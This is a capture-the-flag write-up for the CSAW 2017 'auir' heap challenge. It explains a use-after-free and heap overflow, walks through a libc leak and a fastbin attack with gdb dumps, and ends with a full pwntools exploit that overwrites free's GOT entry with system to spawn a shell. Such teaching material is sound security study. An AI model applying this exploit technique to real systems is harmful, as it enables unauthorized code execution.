# csaw 2017 auir

Let's take a look at the binary:

```
$	pwn checksec auir 
[*] '/Hackery/pod/modules/fastbin_attack/csaw17_auir/auir'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$	file auir 
auir: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, stripped
$	./auir 
|-------------------------------|
|AUIR AUIR AUIR AUIR AUIR AUIR A|
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>
```

So we can see that we are dealing with a `64` bit binary, with a Non-Executable stack. The program gives us a menu to either Make/Destroy/Fix/Display Zealots and Skills. In addition to that we are given a libc file `libc-2.23.so`

## Reversing

So when we reverse this, it becomes clear pretty quickly that the code has been obfuscated and will be a pain to reverse. How I reversed this was I looked for strings that a particular option displayed, which would lead me to a function, and I would just skim over the C pseudocode for it. Also I did a bit of guess and check with assuming what options did what. Then I would go into gdb, and verify what I saw from the function. From that we can determine that the 5 options do the following:

```
MAKE ZEALOTS:	Prompts you for a size, allocates that size in the heap with malloc, then allows you to scan in the amount of bytes allocated into the heap chunk.
DESTROY ZEALOTS: It frees the heap chunk for the zealot you give it.
FIX ZEALOTS: Allows you to scan in data into a Zealot. Does not check for an overflow.
DISPLAY SKILLS: Prints the first 8 bytes of data from the Zealot you provide it with.
GO HOME: Exits the program
```

In addition to that, we find that in the bss section of memory there are two interesting pieces of data. These can also be found by searching for the data we inputted and seeing where in the heap they were, then searching for where the pointers to those memory areas were stored (based on previous experience I kind of assumed this program would have something like these):

```
0x605310:	Stores pointers for all of the Zealots allocated
0x605630:	Integer that stores the amount of Zealots allocated
```

and we can confirm that with gdb:

```
gdb-peda$ x/4g 0x605310
0x605310:	0x0000000000617c20	0x0000000000617c40
0x605320:	0x0000000000617c60	0x0000000000000000
gdb-peda$ x/x 0x605630
0x605630:	0x0000000000000003
gdb-peda$ x/s 0x617c20
0x617c20:	"15935728\n"
gdb-peda$ x/s 0x617c40
0x617c40:	"75395128\n"
```

Now what is interesting here, is that if we destroy a zealot, a pointer for it in the bss remains, and the integer which holds the total count stays the same. This means that even after we free the chunk of space allocated for a zealot, we can edit that space again, and even free it again (both of which are major bugs). In addition to that, we also have the heap overflow bug from the FIX ZEALOTS option not checking if it is going to overflow the space it is writing to. So to sum it all up, we have a Heap Overflow bug in FIX ZEALOTS, and a Use After Free and Double Free bug because the DESTROY ZEALOTS leaves behind a pointer it frees.

## Exploitation

So we have a Use After Free and a heap overflow bug. We will use the use after free bug to get a libc infoleak, by allocating several chunks then freeing them. In this version of libc it stores arena pointers around certain freed chunks which point to somewhere in the libc, so by printing freed chunks we will be able to leak libc addresses if we align it right.

Proceeding that we will use the use after free to execute a fastbin attack. We will allocate two chunks of a similar fastbin size, and free them. Then we will edit the chunk that is on the top of the fastbin (the last one freed). Since with how the fastbin works, the heap memory should be containing a pointer to the next chunk of memory. We will edit it to point to the bss a bit before `0x505310` (where the heap pointers are). Also the reason why it is a bit before is for both to account for heap metadata that will take up space, and if we get too close we will fail a malloc check and the program will crash while it tries to allocate that chunk. After we make the edit, by allocating another chunk of the same size as the two we freed, our fake chunk should be placed at the top of the fastbin. Then by allocating one more chunk of the same size, we will get malloc to return a pointer to our fake chunk.

Using that fake chunk, we will be able to overwrite the heap pointers stored at `0x605310`. We will use this to overwrite the first heap pointer with the got entry address of free. Since RELRO isn't enabled, we can do what we are about to do next. Then we will write to the chunk at index `0`, which will write to the got table entry for free. We will just overwrite it with system. Then we will just overwrite the value of the chunk at index `1` to be `/bin/sh\x00`. After that we will be able to call `system("/bin/sh")` by freeing the chunk at index `1`.

So that was a brief high level overview. Let's see how the memory is actually manipulated:

### Libc Infoleak

First allocated some chunks (I allocated four):

```
gef➤  x/100g 0xdfec10
0xdfec10:	0x0	0x101
0xdfec20:	0x3030303030303030	0x3030303030303030
0xdfec30:	0x3030303030303030	0x3030303030303030
0xdfec40:	0x3030303030303030	0x3030303030303030
0xdfec50:	0x3030303030303030	0x3030303030303030
0xdfec60:	0x3030303030303030	0x3030303030303030
0xdfec70:	0x3030303030303030	0x3030303030303030
0xdfec80:	0x3030303030303030	0x3030303030303030
0xdfec90:	0x3030303030303030	0x3030303030303030
0xdfeca0:	0x3030303030303030	0x3030303030303030
0xdfecb0:	0x3030303030303030	0x3030303030303030
0xdfecc0:	0x3030303030303030	0x3030303030303030
0xdfecd0:	0x3030303030303030	0x3030303030303030
0xdfece0:	0x3030303030303030	0x3030303030303030
0xdfecf0:	0x3030303030303030	0x3030303030303030
0xdfed00:	0x3030303030303030	0x3030303030303030
0xdfed10:	0x0	0x81
0xdfed20:	0x3131313131313131	0x3131313131313131
0xdfed30:	0x3131313131313131	0x3131313131313131
0xdfed40:	0x3131313131313131	0x3131313131313131
0xdfed50:	0x3131313131313131	0x3131313131313131
0xdfed60:	0x3131313131313131	0x3131313131313131
0xdfed70:	0x3131313131313131	0x3131313131313131
0xdfed80:	0x3131313131313131	0x3131313131313131
0xdfed90:	0x0	0x101
0xdfeda0:	0x3232323232323232	0x3232323232323232
0xdfedb0:	0x3232323232323232	0x3232323232323232
0xdfedc0:	0x3232323232323232	0x3232323232323232
0xdfedd0:	0x3232323232323232	0x3232323232323232
0xdfede0:	0x3232323232323232	0x3232323232323232
0xdfedf0:	0x3232323232323232	0x3232323232323232
0xdfee00:	0x3232323232323232	0x3232323232323232
0xdfee10:	0x3232323232323232	0x3232323232323232
0xdfee20:	0x3232323232323232	0x3232323232323232
0xdfee30:	0x3232323232323232	0x3232323232323232
0xdfee40:	0x3232323232323232	0x3232323232323232
0xdfee50:	0x3232323232323232	0x3232323232323232
0xdfee60:	0x3232323232323232	0x3232323232323232
0xdfee70:	0x3232323232323232	0x3232323232323232
0xdfee80:	0x3232323232323232	0x3232323232323232
0xdfee90:	0x0	0x41
0xdfeea0:	0x3333333333333333	0x3333333333333333
0xdfeeb0:	0x3333333333333333	0x3333333333333333
0xdfeec0:	0x3333333333333333	0x3333333333333333
0xdfeed0:	0x0	0x20131
```

Then I freed the bottom two and checked to see what the memory was like:
```
gef➤  x/100g 0xdfec10
0xdfec10:	0x0	0x101
0xdfec20:	0x3030303030303030	0x3030303030303030
0xdfec30:	0x3030303030303030	0x3030303030303030
0xdfec40:	0x3030303030303030	0x3030303030303030
0xdfec50:	0x3030303030303030	0x3030303030303030
0xdfec60:	0x3030303030303030	0x3030303030303030
0xdfec70:	0x3030303030303030	0x3030303030303030
0xdfec80:	0x3030303030303030	0x3030303030303030
0xdfec90:	0x3030303030303030	0x3030303030303030
0xdfeca0:	0x3030303030303030	0x3030303030303030
0xdfecb0:	0x3030303030303030	0x3030303030303030
0xdfecc0:	0x3030303030303030	0x3030303030303030
0xdfecd0:	0x3030303030303030	0x3030303030303030
0xdfece0:	0x3030303030303030	0x3030303030303030
0xdfecf0:	0x3030303030303030	0x3030303030303030
0xdfed00:	0x3030303030303030	0x3030303030303030
0xdfed10:	0x0	0x81
0xdfed20:	0x3131313131313131	0x3131313131313131
0xdfed30:	0x3131313131313131	0x3131313131313131
0xdfed40:	0x3131313131313131	0x3131313131313131
0xdfed50:	0x3131313131313131	0x3131313131313131
0xdfed60:	0x3131313131313131	0x3131313131313131
0xdfed70:	0x3131313131313131	0x3131313131313131
0xdfed80:	0x3131313131313131	0x3131313131313131
0xdfed90:	0x0	0x101
0xdfeda0:	0x7f4572c79b78	0x7f4572c79b78
0xdfedb0:	0x3232323232323232	0x3232323232323232
0xdfedc0:	0x3232323232323232	0x3232323232323232
0xdfedd0:	0x3232323232323232	0x3232323232323232
0xdfede0:	0x3232323232323232	0x3232323232323232
0xdfedf0:	0x3232323232323232	0x3232323232323232
0xdfee00:	0x3232323232323232	0x3232323232323232
0xdfee10:	0x3232323232323232	0x3232323232323232
0xdfee20:	0x3232323232323232	0x3232323232323232
0xdfee30:	0x3232323232323232	0x3232323232323232
0xdfee40:	0x3232323232323232	0x3232323232323232
0xdfee50:	0x3232323232323232	0x3232323232323232
0xdfee60:	0x3232323232323232	0x3232323232323232
0xdfee70:	0x3232323232323232	0x3232323232323232
0xdfee80:	0x3232323232323232	0x3232323232323232
0xdfee90:	0x100	0x40
0xdfeea0:	0x0	0x3333333333333333
0xdfeeb0:	0x3333333333333333	0x3333333333333333
0xdfeec0:	0x3333333333333333	0x3333333333333333
0xdfeed0:	0x0	0x20131
```

So we can see that there are the arena pointers at `0xdfeda0` and `0xdfeda8` which directly overlap with the start of our third chunk. We can leak the first pointer by just viewing the chunk at index `2`. With that we get our libc infoleak.

### Fastbin Attack

Next up is the fastbin attack to allocate a fake chunk in the bss, to start overwriting heap pointers and do a got table overwrite. Picking up from where we left off in the libc infoleak, we allocate two chunks of size `0x60` and free them to add them to the fastbin list:

```
gef➤  x/10g 0x605310
0x605310:	0xfd6c20	0xfd6d20
0x605320:	0xfd6da0	0xfd6ea0
0x605330:	0xfd6da0	0xfd6e10
0x605340:	0x0	0x0
0x605350:	0x0	0x0
gef➤  x/g 0xfd6e10
0xfd6e10:	0xfd6d90
```

So we can see that the top chunk has a next pointer to the next chunk in the fastbin. We are going to edit that to be the address of our fake chunk:

```
gef➤  x/g 0xfd6e10
0xfd6e10:	0x6052ed
```

Next up we will allocate a chunk of size `0x60`. This will give us chunk `5`, and add our fake chunk to the top of the fastbin:

```
gef➤  x/10g 0x605310
0x605310:	0xfd6c20	0xfd6d20
0x605320:	0xfd6da0	0xfd6ea0
0x605330:	0xfd6da0	0xfd6e10
0x605340:	0xfd6e10	0x0
0x605350:	0x0	0x0
gef➤  search-pattern 0x00000000006052ed
[+] Searching '\xed\x52\x60\x00\x00\x00\x00\x00' in memory
[+] In '/home/guyinatuxedo/Desktop/elementary/libc-2.23.so'(0x7f56bca04000-0x7f56bca06000), permission=rw-
  0x7f56bca04b50 - 0x7f56bca04b70  →   "\xed\x52\x60\x00\x00\x00\x00\x00[...]" 
```

So we can see that malloc returned the chunk we got at index `5` (`0x605338`). We also see that our fake chunk `0x6052ed` is in the libc, in the fastbin list. We will allocate another chunk of `0x60` and instead of it giving us the chunk at index `4`, it will give us our fake chunk:

```
gef➤  x/10g 0x605310
0x605310:	0xfd6c20	0xfd6d20
0x605320:	0xfd6da0	0xfd6ea0
0x605330:	0xfd6da0	0xfd6e10
0x605340:	0xfd6e10	0x6052fd
0x605350:	0x0	0x0
```

So we can see that we were able to execute the fastbin attack to get malloc to return our fake chunk to the bss. Next up we will overwrite the first heap pointer with the got table entry address for free:

```
gef➤  x/10g 0x605310
0x605310:	0x605060	0xfd6d20
0x605320:	0xfd6da0	0xfd6ea0
0x605330:	0xfd6da0	0xfd6e10
0x605340:	0xfd6e10	0x6052fd
0x605350:	0x0	0x0
gef➤  x/g 0x605060
0x605060:	0x7f56bc6c44f0
gef➤  x/i 0x7f56bc6c44f0
   0x7f56bc6c44f0 <free>:	push   r13
```

Next up, we will do the got table overwrite:

```
gef➤  x/10g 0x605310
0x605310:	0x0000000000605060	0x0000000000fd6d20
0x605320:	0x0000000000fd6da0	0x0000000000fd6ea0
0x605330:	0x0000000000fd6da0	0x0000000000fd6e10
0x605340:	0x0000000000fd6e10	0x00000000006052fd
0x605350:	0x0000000000000000	0x0000000000000000
gef➤  x/g 0x605060
0x605060:	0x00007f56bc685390
gef➤  x/i 0x00007f56bc685390
   0x7f56bc685390 <system>:	test   rdi,rdi
```

Lastly we will just edit the chunk at index `1` to be `/bin/sh\x00` (we could of just created the chunk to have that string, but that would make sense):

```
gef➤  x/10g 0x605310
0x605310:	0x0000000000605060	0x0000000000fd6d20
0x605320:	0x0000000000fd6da0	0x0000000000fd6ea0
0x605330:	0x0000000000fd6da0	0x0000000000fd6e10
0x605340:	0x0000000000fd6e10	0x00000000006052fd
0x605350:	0x0000000000000000	0x0000000000000000
gef➤  x/s 0xfd6d20
0xfd6d20:	"/bin/sh"
```

After that, we just have to free the chunk at index `1` and it will run `system("/bin/sh")` and give us our shell!

## Exploit

Putting it all together, we get the following exploit. In order for this exploit to work, you do need to run it with libc version `libc-2.23.so`. Also I ran this exploit on Ubuntu 16.04:

```
from pwn import *

# Establish the target binary and libc version
target = process('./auir', env={"LD_PRELOAD":"./libc-2.23.so"})
elf = ELF('./auir')
libc = ELF('libc-2.23.so')
#gdb.attach(target)

#Establish the functions to interact with the elf
def makeZealot(size, content):
	target.recvuntil(">>")
	target.sendline('1')
	target.recvuntil(">>")
	target.sendline(str(size))
	target.recvuntil(">>")
	target.send(content)

def destroyZealot(index):
	target.recvuntil(">>")
	target.sendline('2')
	target.recvuntil(">>")
	target.sendline(str(index))

def fixZealot(index, size, content):
	target.recvuntil(">>")
	target.sendline('3')
	target.recvuntil(">>")
	target.sendline(str(index))
	target.recvuntil(">>")
	target.sendline(str(size))
	target.recvuntil(">>")
	target.send(content)

def showZealot(index):
	target.recvuntil(">>")
	target.sendline('4')
	target.recvuntil(">>")
	target.sendline(str(index))

# Make the inital chunks for the libc infoleak
makeZealot(0xf0, "0"*0xf0)#	0
makeZealot(0x70, "1"*0x70)#	1
makeZealot(0xf0, "2"*0xf0)#	2
makeZealot(0x30, "3"*0x30)#	3

# Free the bottom to chunks, to align arena libc pointer with chunk 2
destroyZealot(3)
destroyZealot(2)

# Leake the libc pointer stored in chunk 2
showZealot(2)

# Parse out the infoleak, calculate libc base
target.recvuntil("[*]SHOWING....\n")

leak = target.recvuntil("|").strip("|")
leak = u64(leak + "\x00"*(8 - len(leak)))
libcBase = leak - 0x3c4b78

print "libc base: " + hex(libcBase)

# Calculate the address of the fake chunk
fakeChunk = 0x605310 - 0x23

# Make our two chunks for the fastbin attack
makeZealot(0x60, "1"*0x60)# 4
makeZealot(0x60, "2"*0x60)# 5

# Free those two chunks
destroyZealot(4)
destroyZealot(5)

# Edit chunk 5 which is on top of the fastbin list, overwrite the pointer to the next fastbin with our fakechunk address
fixZealot(5, 0x60, p64(fakeChunk) + p64(0) + "0"*80)

# Allocate a new chunk, move our fake chunk to the top of the fastbin list
makeZealot(0x60, "6"*0x60)# 6

# Allocate a new chunk, which will be our fake chunk right before the heap ptrs stored in the bss
makeZealot(0x60, "0")# 7

# Overwrite the first heap ptr with the got table entry for free
fixZealot(7, 0x1b, '0'*0x13 + p64(elf.got['free']))

# Overwrite got entry for free with system
fixZealot(0, 0x8, p64(libcBase + libc.symbols['system']))

# Write the string `/bin/sh` to chunk 1
fixZealot(1, 0x9, "/bin/sh\x00")

# Free chunk 1 to call system("/bin/sh")
destroyZealot(1)

# Drop to an interactive shell to use our newly popped shell
target.interactive()
```

When we run it:

```
$	python exploit.py 
[+] Starting local process './auir': pid 5157
[*] '/home/guyinatuxedo/Desktop/elementary/auir'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/guyinatuxedo/Desktop/elementary/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc base: 0x7f5d6d785000
[*] Switching to interactive mode
[*]BREAKING....
$ ls
auir  core  exploit.py    libc-2.23.so
$ pwd
/home/guyinatuxedo/Desktop/elementary
```

Just like that, we popped a shell!